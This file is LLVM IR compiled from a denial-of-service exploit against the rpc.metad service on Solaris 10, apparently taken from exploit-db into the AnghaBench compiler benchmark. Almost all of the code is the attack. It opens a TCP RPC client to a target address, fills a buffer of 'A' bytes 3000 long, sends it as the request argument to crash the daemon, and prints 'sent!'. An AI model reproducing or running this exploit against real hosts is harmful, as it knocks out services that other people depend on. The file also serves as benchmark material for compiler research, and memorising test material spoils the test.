; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/solaris/dos/extr_5258.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/solaris/dos/extr_5258.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.timeval = type { i32, i32, i32 }
%struct.TYPE_9__ = type { i32 }
%struct.hostent = type { i32 }
%struct.sockaddr_in = type { %struct.TYPE_7__, i32, i32 }
%struct.TYPE_7__ = type { i32 }
%struct.TYPE_8__ = type { i8* }

@__const.main.tm = private unnamed_addr constant %struct.timeval { i32 10, i32 0, i32 0 }, align 4
@.str = private unnamed_addr constant [27 x i8] c"rpc.metad for solaris 10\0A\0A\00", align 1
@.str.1 = private unnamed_addr constant [19 x i8] c"usage: %s address\0A\00", align 1
@.str.2 = private unnamed_addr constant [39 x i8] c"Using version %d and request no. %d!!\0A\00", align 1
@METAD_VERS = common dso_local global i32 0, align 4
@METAD_FUNC = common dso_local global i32 0, align 4
@.str.3 = private unnamed_addr constant [12 x i8] c"timeout=%d \00", align 1
@stdout = common dso_local global i32 0, align 4
@AF_INET = common dso_local global i32 0, align 4
@EADDRNOTAVAIL = common dso_local global i32 0, align 4
@errno = common dso_local global i32 0, align 4
@.str.4 = private unnamed_addr constant [6 x i8] c"error\00", align 1
@RPC_ANYSOCK = common dso_local global i32 0, align 4
@METAD_PROG = common dso_local global i32 0, align 4
@.str.5 = private unnamed_addr constant [10 x i8] c"localhost\00", align 1
@xdr_req = common dso_local global i32 0, align 4
@xdr_void = common dso_local global i32 0, align 4
@RPC_SUCCESS = common dso_local global i32 0, align 4
@.str.6 = private unnamed_addr constant [24 x i8] c"\0Aerror: not vulnerable\0A\00", align 1
@.str.7 = private unnamed_addr constant [7 x i8] c"sent!\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca [30000 x i8], align 16
  %7 = alloca [4 x i8], align 1
  %8 = alloca i8*, align 8
  %9 = alloca i8*, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca %struct.TYPE_9__*, align 8
  %18 = alloca i32, align 4
  %19 = alloca %struct.hostent*, align 8
  %20 = alloca %struct.sockaddr_in, align 4
  %21 = alloca %struct.timeval, align 8
  %22 = alloca %struct.TYPE_8__, align 8
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i32 1, i32* %13, align 4
  store i32 0, i32* %14, align 4
  store i32 0, i32* %15, align 4
  %23 = bitcast %struct.timeval* %21 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 4 %23, i8* align 4 bitcast (%struct.timeval* @__const.main.tm to i8*), i64 12, i1 false)
  %24 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str, i64 0, i64 0))
  %25 = load i32, i32* %4, align 4
  %26 = icmp slt i32 %25, 2
  br i1 %26, label %27, label %33

27:                                               ; preds = %2
  %28 = load i8**, i8*** %5, align 8
  %29 = getelementptr inbounds i8*, i8** %28, i64 0
  %30 = load i8*, i8** %29, align 8
  %31 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.1, i64 0, i64 0), i8* %30)
  %32 = call i32 @exit(i32 -1) #4
  unreachable

33:                                               ; preds = %2
  %34 = load i32, i32* @METAD_VERS, align 4
  %35 = load i32, i32* @METAD_FUNC, align 4
  %36 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.2, i64 0, i64 0), i32 %34, i32 %35)
  %37 = getelementptr inbounds [4 x i8], [4 x i8]* %7, i64 0, i64 0
  %38 = bitcast i8* %37 to i64*
  %39 = load i64, i64* %38, align 1
  %40 = call i32 @ntohl(i64 %39)
  %41 = getelementptr inbounds %struct.timeval, %struct.timeval* %21, i32 0, i32 1
  %42 = load i32, i32* %41, align 4
  %43 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.3, i64 0, i64 0), i32 %40, i32 %42)
  %44 = load i32, i32* @stdout, align 4
  %45 = call i32 @fflush(i32 %44)
  %46 = load i32, i32* @AF_INET, align 4
  %47 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %20, i32 0, i32 2
  store i32 %46, i32* %47, align 4
  %48 = load i32, i32* %15, align 4
  %49 = call i32 @htons(i32 %48)
  %50 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %20, i32 0, i32 1
  store i32 %49, i32* %50, align 4
  %51 = load i8**, i8*** %5, align 8
  %52 = getelementptr inbounds i8*, i8** %51, i64 1
  %53 = load i8*, i8** %52, align 8
  %54 = call i32 @inet_addr(i8* %53)
  %55 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %20, i32 0, i32 0
  %56 = getelementptr inbounds %struct.TYPE_7__, %struct.TYPE_7__* %55, i32 0, i32 0
  store i32 %54, i32* %56, align 4
  %57 = icmp eq i32 %54, -1
  br i1 %57, label %58, label %75

58:                                               ; preds = %33
  %59 = load i8**, i8*** %5, align 8
  %60 = getelementptr inbounds i8*, i8** %59, i64 1
  %61 = load i8*, i8** %60, align 8
  %62 = call %struct.hostent* @gethostbyname(i8* %61)
  store %struct.hostent* %62, %struct.hostent** %19, align 8
  %63 = icmp eq %struct.hostent* %62, null
  br i1 %63, label %64, label %68

64:                                               ; preds = %58
  %65 = load i32, i32* @EADDRNOTAVAIL, align 4
  store i32 %65, i32* @errno, align 4
  %66 = call i32 @perror(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.4, i64 0, i64 0))
  %67 = call i32 @exit(i32 -1) #4
  unreachable

68:                                               ; preds = %58
  %69 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %20, i32 0, i32 0
  %70 = getelementptr inbounds %struct.TYPE_7__, %struct.TYPE_7__* %69, i32 0, i32 0
  %71 = load %struct.hostent*, %struct.hostent** %19, align 8
  %72 = getelementptr inbounds %struct.hostent, %struct.hostent* %71, i32 0, i32 0
  %73 = load i32, i32* %72, align 4
  %74 = call i32 @memcpy(i32* %70, i32 %73, i32 4)
  br label %75

75:                                               ; preds = %68, %33
  %76 = load i32, i32* @RPC_ANYSOCK, align 4
  store i32 %76, i32* %16, align 4
  %77 = load i32, i32* @METAD_PROG, align 4
  %78 = load i32, i32* @METAD_VERS, align 4
  %79 = call %struct.TYPE_9__* @clnttcp_create(%struct.sockaddr_in* %20, i32 %77, i32 %78, i32* %16, i32 0, i32 0)
  store %struct.TYPE_9__* %79, %struct.TYPE_9__** %17, align 8
  %80 = icmp ne %struct.TYPE_9__* %79, null
  br i1 %80, label %84, label %81

81:                                               ; preds = %75
  %82 = call i32 @clnt_pcreateerror(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.4, i64 0, i64 0))
  %83 = call i32 @exit(i32 -1) #4
  unreachable

84:                                               ; preds = %75
  %85 = call i32 @authunix_create(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.5, i64 0, i64 0), i32 0, i32 0, i32 0, i32* null)
  %86 = load %struct.TYPE_9__*, %struct.TYPE_9__** %17, align 8
  %87 = getelementptr inbounds %struct.TYPE_9__, %struct.TYPE_9__* %86, i32 0, i32 0
  store i32 %85, i32* %87, align 4
  %88 = getelementptr inbounds [30000 x i8], [30000 x i8]* %6, i64 0, i64 0
  %89 = call i32 @memset(i8* %88, i8 signext 65, i32 30000)
  %90 = getelementptr inbounds [30000 x i8], [30000 x i8]* %6, i64 0, i64 3000
  store i8 0, i8* %90, align 8
  %91 = getelementptr inbounds [30000 x i8], [30000 x i8]* %6, i64 0, i64 0
  %92 = getelementptr inbounds %struct.TYPE_8__, %struct.TYPE_8__* %22, i32 0, i32 0
  store i8* %91, i8** %92, align 8
  %93 = load %struct.TYPE_9__*, %struct.TYPE_9__** %17, align 8
  %94 = load i32, i32* @METAD_FUNC, align 4
  %95 = load i32, i32* @xdr_req, align 4
  %96 = load i32, i32* @xdr_void, align 4
  %97 = call i32 @clnt_call(%struct.TYPE_9__* %93, i32 %94, i32 %95, %struct.TYPE_8__* %22, i32 %96, i32* null, %struct.timeval* byval(%struct.timeval) align 8 %21)
  store i32 %97, i32* %18, align 4
  %98 = load i32, i32* %18, align 4
  %99 = load i32, i32* @RPC_SUCCESS, align 4
  %100 = icmp eq i32 %98, %99
  br i1 %100, label %101, label %104

101:                                              ; preds = %84
  %102 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.6, i64 0, i64 0))
  %103 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.7, i64 0, i64 0))
  br label %104

104:                                              ; preds = %101, %84
  %105 = load i32, i32* %3, align 4
  ret i32 %105
}

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* noalias nocapture writeonly, i8* noalias nocapture readonly, i64, i1 immarg) #1

declare dso_local i32 @printf(i8*, ...) #2

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #3

declare dso_local i32 @ntohl(i64) #2

declare dso_local i32 @fflush(i32) #2

declare dso_local i32 @htons(i32) #2

declare dso_local i32 @inet_addr(i8*) #2

declare dso_local %struct.hostent* @gethostbyname(i8*) #2

declare dso_local i32 @perror(i8*) #2

declare dso_local i32 @memcpy(i32*, i32, i32) #2

declare dso_local %struct.TYPE_9__* @clnttcp_create(%struct.sockaddr_in*, i32, i32, i32*, i32, i32) #2

declare dso_local i32 @clnt_pcreateerror(i8*) #2

declare dso_local i32 @authunix_create(i8*, i32, i32, i32, i32*) #2

declare dso_local i32 @memset(i8*, i8 signext, i32) #2

declare dso_local i32 @clnt_call(%struct.TYPE_9__*, i32, i32, %struct.TYPE_8__*, i32, i32*, %struct.timeval* byval(%struct.timeval) align 8) #2

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { argmemonly nounwind willreturn }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
